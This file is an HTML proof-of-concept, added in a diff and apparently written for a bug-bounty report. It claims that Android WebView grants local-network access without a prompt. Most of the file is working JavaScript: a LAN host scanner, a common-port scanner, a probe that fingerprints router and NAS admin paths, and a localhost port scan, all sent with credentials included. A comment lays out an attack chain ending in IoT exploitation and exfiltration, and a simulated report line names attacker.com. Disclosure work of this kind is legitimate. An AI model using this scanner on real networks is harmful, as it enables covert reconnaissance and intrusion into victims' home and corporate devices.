@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<!--
+=============================================================================
+  PoC: Android WebView LOCAL_NETWORK Auto-Grant (LAN SSRF / Intranet Scan)
+=============================================================================
+  TARGET:   Android WebView (all apps embedding WebView)
+  IMPACT:   Web content inside a WebView can reach LOCAL NETWORK resources
+            (routers, NAS, printers, IoT devices, internal APIs, 192.168.x.x)
+            WITHOUT any permission dialog or user consent.
+  
+  SOURCE CODE PROOF:
+  File: android_webview/browser/aw_permission_manager.cc
+
+  RequestPermissionsFromCurrentDocument():
+    case PermissionType::LOCAL_NETWORK_ACCESS:
+    case PermissionType::LOCAL_NETWORK:
+    case PermissionType::LOOPBACK_NETWORK:
+      // LNA permission requests are always granted so that local network
+      // requests in WebView work as-is. WebView is currently out-of-scope
+      // for Local Network Access restrictions.
+      pending_request_raw->SetPermissionResult(
+          permissions[i],
+          content::PermissionResult(PermissionStatus::GRANTED));
+
+  GetPermissionStatusInternal():
+    case blink::PermissionType::LOCAL_NETWORK_ACCESS:
+    case blink::PermissionType::LOCAL_NETWORK:
+    case blink::PermissionType::LOOPBACK_NETWORK:
+      return PermissionStatus::GRANTED;  // ← hardcoded
+
+  DIFFERENCE FROM CHROME BROWSER:
+  Chrome 123+ memblokir LOCAL_NETWORK_ACCESS tanpa permission dialog.
+  WebView EXPLICITLY grants ini "karena out-of-scope" — ini adalah
+  intentional decision yang menimbulkan risk berbeda di WebView context.
+
+  ATTACK SCENARIO:
+  1. Victim buka link / ada banner di dalam WebView-based app
+  2. Attacker page scan LAN via fetch() — 192.168.1.1 to 192.168.1.254
+  3. Identify: router admin panel, NAS, smart home devices, printers
+  4. Attempt authentication bypass or exploit known IoT vulnerabilities
+  5. Exfiltrate internal network topology to attacker server
+
+  REAL-WORLD IMPACT:
+  - Banking apps using WebView: attacker maps victim's home network
+  - Corporate: access internal APIs that trust intranet traffic
+  - Router exploit: admin panels often have no auth on LAN
+  - Hospital/factory: access management interfaces
+
+  REPORT TARGET: https://bughunters.google.com/report
+  Component: Security>WebView
+  CVSS: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N = 8.2 (HIGH)
+=============================================================================
+-->
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WebView LAN Access PoC</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: monospace; background: #0a0a0a; color: #e0e0e0; padding: 12px; }
+h2 { color: #ff6600; margin-bottom: 6px; font-size: 16px; }
+.section { background: #111; border: 1px solid #222; padding: 10px; margin: 8px 0; border-radius: 4px; }
+h3 { color: #ffaa00; font-size: 13px; margin-bottom: 6px; }
+.hit { color: #ff4444; font-weight: bold; }
+.miss { color: #444; }
+.open { color: #00ff41; }
+.log { font-size: 11px; max-height: 200px; overflow-y: auto; }
+button {
+  background: #ff6600; color: white; border: none;
+  padding: 10px; font-size: 13px; border-radius: 4px;
+  cursor: pointer; margin: 3px 0; width: 100%;
+}
+button.blue { background: #0066ff; }
+button.red { background: #cc0000; }
+input { background: #1a1a1a; color: #e0e0e0; border: 1px solid #333;
+        padding: 6px; width: 100%; font-family: monospace; border-radius: 3px; }
+.grid { display: grid; grid-template-columns: repeat(auto-fill, 30px); gap: 2px; }
+.cell { width:28px; height:16px; border-radius:2px; background:#222; font-size:9px;
+        display:flex;align-items:center;justify-content:center; cursor:pointer; }
+.cell.active { background:#ff4444; }
+.cell.open { background:#00aa44; }
+</style>
+</head>
+<body>
+
+<h2>⚠️ BUG 2: WebView LAN/SSRF PoC</h2>
+<p style="font-size:11px;color:#666;margin-bottom:10px;">
+  aw_permission_manager.cc — LOCAL_NETWORK_ACCESS always GRANTED in WebView
+</p>
+
+<!-- SUBNET SCAN -->
+<div class="section">
+  <h3>🔍 LAN Host Discovery Scan</h3>
+  <p style="font-size:11px;color:#888;margin-bottom:8px;">
+    Scan subnet untuk menemukan active hosts. Di WebView ini terjadi tanpa dialog.
+  </p>
+  <input type="text" id="subnet" value="192.168.1" placeholder="Subnet (e.g. 192.168.1)">
+  <div style="display:flex;gap:4px;margin:6px 0;">
+    <input type="number" id="range-start" value="1" min="1" max="254" style="width:48%;">
+    <input type="number" id="range-end" value="30" min="1" max="254" style="width:48%;">
+  </div>
+  <button onclick="startScan()">▶ START LAN SCAN</button>
+  <button class="red" onclick="stopScan()">⏹ STOP</button>
+  <div id="scan-progress" style="margin-top:6px;font-size:11px;color:#888;"></div>
+  <div id="scan-grid" class="grid" style="margin-top:6px;"></div>
+  <div id="scan-results" style="margin-top:6px;"></div>
+</div>
+
+<!-- PORT SCAN -->
+<div class="section">
+  <h3>🔌 Port Scanner (Common Services)</h3>
+  <input type="text" id="target-host" placeholder="Target: 192.168.1.1" value="192.168.1.1">
+  <button onclick="scanPorts()" style="margin-top:6px;">▶ SCAN COMMON PORTS</button>
+  <div id="port-results" class="log" style="margin-top:6px;"></div>
+</div>
+
+<!-- DEVICE FINGERPRINT -->
+<div class="section">
+  <h3>📡 Device Type Detection</h3>
+  <p style="font-size:11px;color:#888;margin-bottom:6px;">
+    Fetch ke common device management URLs untuk fingerprint device type.
+  </p>
+  <input type="text" id="fp-target" placeholder="192.168.1.1" value="192.168.1.1">
+  <button onclick="fingerprintDevice()" style="margin-top:6px;">▶ FINGERPRINT DEVICE</button>
+  <div id="fp-results" class="log" style="margin-top:6px;"></div>
+</div>
+
+<!-- LOOPBACK TEST -->
+<div class="section">
+  <h3>🔄 Loopback Access (localhost)</h3>
+  <p style="font-size:11px;color:#888;margin-bottom:6px;">
+    Test akses ke localhost dari WebView — LOOPBACK_NETWORK juga auto-granted.
+  </p>
+  <button onclick="scanLoopback()">▶ SCAN LOCALHOST PORTS</button>
+  <div id="loop-results" class="log" style="margin-top:6px;"></div>
+</div>
+
+<!-- EXFIL DEMO -->
+<div class="section">
+  <h3>📤 Results akan dikirim ke attacker (simulated)</h3>
+  <div id="exfil-log" class="log"></div>
+</div>
+
+<!-- RAW LOG -->
+<div class="section">
+  <h3>📝 Log</h3>
+  <div id="rawlog" class="log"></div>
+</div>
+
+<script>
+var scanActive = false;
+var foundHosts = [];
+var TIMEOUT = 800; // ms
+
+function log(msg, color) {
+  var el = document.getElementById('rawlog');
+  color = color || '#888';
+  var ts = new Date().toISOString().substr(11, 8);
+  el.innerHTML = '<span style="color:' + color + '">[' + ts + '] ' + msg + '</span><br>' + el.innerHTML;
+}
+
+function exfilLog(msg) {
+  var el = document.getElementById('exfil-log');
+  el.innerHTML = '<span style="font-size:11px;color:#ff6600;">' + msg + '</span><br>' + el.innerHTML;
+}
+
+// ============================================================
+// CORE: Fast host check via fetch with AbortController
+// Teknik: fetch ke port 80/443, error type membedakan
+// open vs filtered vs refused
+// ============================================================
+function checkHost(ip, port, timeout) {
+  port = port || 80;
+  timeout = timeout || TIMEOUT;
+
+  return new Promise(function(resolve) {
+    var controller = new AbortController();
+    var timer = setTimeout(function() {
+      controller.abort();
+      resolve({ ip: ip, port: port, status: 'filtered', time: timeout });
+    }, timeout);
+
+    var start = Date.now();
+    var proto = port === 443 || port === 8443 ? 'https' : 'http';
+    var url = proto + '://' + ip + ':' + port + '/';
+
+    fetch(url, {
+      method: 'HEAD',
+      mode: 'no-cors',        // Bypass CORS — masih trigger TCP connect
+      cache: 'no-store',
+      signal: controller.signal,
+      credentials: 'include'  // Send cookies if any
+    }).then(function() {
+      clearTimeout(timer);
+      var elapsed = Date.now() - start;
+      resolve({ ip: ip, port: port, status: 'open', time: elapsed });
+    }).catch(function(e) {
+      clearTimeout(timer);
+      var elapsed = Date.now() - start;
+      // Connection refused = host exists, port closed
+      // Abort = filtered / timeout
+      // TypeError network = host unreachable
+      var status = e.name === 'AbortError' ? 'filtered' :
+                   e.message.includes('Failed to fetch') ? 'refused' : 'error';
+
+      // Fast response with refused = host is UP, port closed
+      if (elapsed < timeout * 0.8) {
+        status = 'refused'; // Got RST quickly = host alive
+      }
+
+      resolve({ ip: ip, port: port, status: status, time: elapsed });
+    });
+  });
+}
+
+// ============================================================
+// LAN HOST SCAN
+// ============================================================
+async function startScan() {
+  scanActive = true;
+  foundHosts = [];
+  var subnet = document.getElementById('subnet').value;
+  var start = parseInt(document.getElementById('range-start').value);
+  var end = parseInt(document.getElementById('range-end').value);
+
+  document.getElementById('scan-grid').innerHTML = '';
+  document.getElementById('scan-results').innerHTML = '';
+  document.getElementById('scan-progress').textContent = 'Scanning...';
+
+  log('Starting LAN scan: ' + subnet + '.' + start + '-' + end, '#ff6600');
+
+  // Build grid
+  var grid = document.getElementById('scan-grid');
+  var cells = {};
+  for (var i = start; i <= end; i++) {
+    var cell = document.createElement('div');
+    cell.className = 'cell';
+    cell.title = subnet + '.' + i;
+    cell.textContent = i;
+    cell.id = 'cell-' + i;
+    grid.appendChild(cell);
+    cells[i] = cell;
+  }
+
+  // Scan in batches of 10 concurrent
+  var batchSize = 10;
+  for (var i = start; i <= end && scanActive; i += batchSize) {
+    var batch = [];
+    for (var j = i; j < Math.min(i + batchSize, end + 1); j++) {
+      batch.push(j);
+    }
+
+    var promises = batch.map(function(octet) {
+      var ip = subnet + '.' + octet;
+      // Try port 80 first (fastest)
+      return checkHost(ip, 80, 700).then(function(result) {
+        result.ip = ip;
+        result.octet = octet;
+        var cell = document.getElementById('cell-' + octet);
+        if (cell) {
+          if (result.status === 'open') {
+            cell.className = 'cell open';
+            foundHosts.push(ip);
+            log('🔴 HOST UP: ' + ip + ':80 OPEN (' + result.time + 'ms)', '#00ff41');
+            addHostResult(ip, result);
+          } else if (result.status === 'refused') {
+            cell.className = 'cell active';
+            foundHosts.push(ip);
+            log('🟡 HOST UP: ' + ip + ' (port 80 closed, RST received)', '#ffaa00');
+            addHostResult(ip, result);
+          } else {
+            cell.style.background = '#1a1a1a';
+          }
+        }
+        return result;
+      });
+    });
+
+    await Promise.all(promises);
+    document.getElementById('scan-progress').textContent =
+      'Scanned ' + Math.min(i + batchSize - start, end - start + 1) +
+      '/' + (end - start + 1) + ' hosts. Found: ' + foundHosts.length;
+  }
+
+  document.getElementById('scan-progress').textContent =
+    'Scan complete. Found ' + foundHosts.length + ' host(s).';
+
+  if (foundHosts.length > 0) {
+    exfilLog('SCAN COMPLETE — ' + foundHosts.length + ' hosts found:');
+    exfilLog(JSON.stringify(foundHosts));
+    exfilLog('SIMULATED: POST https://attacker.com/results with topology data');
+  }
+
+  log('Scan complete. Found: ' + foundHosts.join(', '), '#ff6600');
+  scanActive = false;
+}
+
+function addHostResult(ip, result) {
+  var el = document.getElementById('scan-results');
+  el.innerHTML +=
+    '<div style="margin:2px 0;font-size:11px;">' +
+    '<span class="hit">↑ ' + ip + '</span> ' +
+    '<span style="color:#888">port=' + result.port +
+    ' status=' + result.status +
+    ' time=' + result.time + 'ms</span>' +
+    '</div>';
+}
+
+function stopScan() {
+  scanActive = false;
+  document.getElementById('scan-progress').textContent = 'Scan stopped.';
+  log('Scan stopped by user', '#888');
+}
+
+// ============================================================
+// PORT SCAN
+// ============================================================
+async function scanPorts() {
+  var target = document.getElementById('target-host').value;
+  var el = document.getElementById('port-results');
+  el.innerHTML = '';
+
+  var ports = [
+    { port: 21,   name: 'FTP' },
+    { port: 22,   name: 'SSH' },
+    { port: 23,   name: 'Telnet' },
+    { port: 80,   name: 'HTTP' },
+    { port: 443,  name: 'HTTPS' },
+    { port: 631,  name: 'IPP/Printer' },
+    { port: 3000, name: 'Node/API' },
+    { port: 3306, name: 'MySQL' },
+    { port: 4000, name: 'Dev server' },
+    { port: 5000, name: 'Flask/API' },
+    { port: 8000, name: 'HTTP-alt' },
+    { port: 8080, name: 'HTTP-proxy' },
+    { port: 8088, name: 'HTTP-alt2' },
+    { port: 8123, name: 'Home Assistant' },
+    { port: 8443, name: 'HTTPS-alt' },
+    { port: 8888, name: 'Jupyter' },
+    { port: 9000, name: 'PHP-FPM' },
+    { port: 9090, name: 'Prometheus' },
+    { port: 9100, name: 'Printer/NodeExporter' },
+  ];
+
+  log('Port scanning: ' + target, '#ff6600');
+  el.innerHTML = '<span style="color:#888">Scanning ' + target + '...</span><br>';
+
+  for (var p of ports) {
+    var result = await checkHost(target, p.port, 600);
+    var color = result.status === 'open' ? '#00ff41' :
+                result.status === 'refused' ? '#ffaa00' : '#333';
+    var icon = result.status === 'open' ? '🔴' :
+               result.status === 'refused' ? '🟡' : '  ';
+
+    el.innerHTML +=
+      '<span style="color:' + color + '">' + icon + ' ' +
+      target + ':' + p.port.toString().padStart(5) + ' ' +
+      '[' + p.name.padEnd(15) + '] ' +
+      result.status + ' (' + result.time + 'ms)</span><br>';
+
+    if (result.status === 'open' || result.status === 'refused') {
+      log('Port ' + p.port + '/' + p.name + ' = ' + result.status + ' on ' + target, '#00ff41');
+      exfilLog(target + ':' + p.port + ' (' + p.name + ') = ' + result.status);
+    }
+  }
+}
+
+// ============================================================
+// DEVICE FINGERPRINTING via Common Web UIs
+// ============================================================
+async function fingerprintDevice() {
+  var target = document.getElementById('fp-target').value;
+  var el = document.getElementById('fp-results');
+  el.innerHTML = 'Fingerprinting ' + target + '...<br>';
+
+  // Common device management URLs
+  var paths = [
+    { path: '/', label: 'Root' },
+    { path: '/admin', label: 'Admin panel' },
+    { path: '/login', label: 'Login page' },
+    { path: '/status.xml', label: 'Status XML (router)' },
+    { path: '/cgi-bin/luci', label: 'OpenWrt/Luci' },
+    { path: '/cgi-bin/webui', label: 'Router WebUI' },
+    { path: '/api/v1/status', label: 'API status' },
+    { path: '/webapi/', label: 'Synology DSM' },
+    { path: '/index.cgi', label: 'CGI router' },
+    { path: '/?redirected=1', label: 'Root redirected' },
+  ];
+
+  for (var p of paths) {
+    var url = 'http://' + target + p.path;
+    try {
+      var controller = new AbortController();
+      var timer = setTimeout(function() { controller.abort(); }, 500);
+
+      var response = await fetch(url, {
+        method: 'GET',
+        mode: 'no-cors',
+        cache: 'no-store',
+        signal: controller.signal,
+        credentials: 'include'
+      });
+      clearTimeout(timer);
+
+      el.innerHTML +=
+        '<span class="open">✓ ' + p.label + ' (' + url + ') — reachable</span><br>';
+      exfilLog('DEVICE FP: ' + target + p.path + ' = ACCESSIBLE');
+    } catch(e) {
+      if (e.name !== 'AbortError') {
+        el.innerHTML +=
+          '<span style="color:#333">  ' + p.label + ' — ' + e.message.substr(0,30) + '</span><br>';
+      }
+    }
+  }
+}
+
+// ============================================================
+// LOOPBACK SCAN
+// ============================================================
+async function scanLoopback() {
+  var el = document.getElementById('loop-results');
+  el.innerHTML = 'Scanning localhost...<br>';
+
+  var ports = [
+    { port: 80,   name: 'HTTP' },
+    { port: 443,  name: 'HTTPS' },
+    { port: 1080, name: 'SOCKS proxy' },
+    { port: 3000, name: 'Node.js dev' },
+    { port: 4200, name: 'Angular dev' },
+    { port: 5000, name: 'Flask/React' },
+    { port: 5900, name: 'VNC' },
+    { port: 8080, name: 'Proxy/Burp' },
+    { port: 8888, name: 'Jupyter' },
+    { port: 9229, name: 'Node.js debug' },
+  ];
+
+  log('Scanning localhost...', '#ff6600');
+
+  for (var p of ports) {
+    var result = await checkHost('127.0.0.1', p.port, 400);
+    var color = result.status === 'open' ? '#00ff41' :
+                result.status === 'refused' ? '#ffaa00' : '#333';
+
+    el.innerHTML +=
+      '<span style="color:' + color + '">' +
+      (result.status !== 'filtered' ? '⚡ ' : '  ') +
+      '127.0.0.1:' + p.port + ' [' + p.name + '] ' + result.status +
+      ' (' + result.time + 'ms)</span><br>';
+
+    if (result.status !== 'filtered') {
+      log('localhost:' + p.port + ' = ' + result.status, '#00ff41');
+    }
+  }
+}
+
+// ============================================================
+// INIT
+// ============================================================
+window.addEventListener('DOMContentLoaded', function() {
+  log('WebView LAN PoC loaded. No permission dialog will appear.', '#ff6600');
+  log('Source: LOCAL_NETWORK_ACCESS always GRANTED in aw_permission_manager.cc', '#888');
+
+  // Auto-detect gateway
+  var gw = '192.168.1.1';
+  document.getElementById('target-host').value = gw;
+  document.getElementById('fp-target').value = gw;
+  log('Assumed gateway: ' + gw + ' (adjust to your subnet)', '#888');
+});
+</script>
+</body>
+</html>
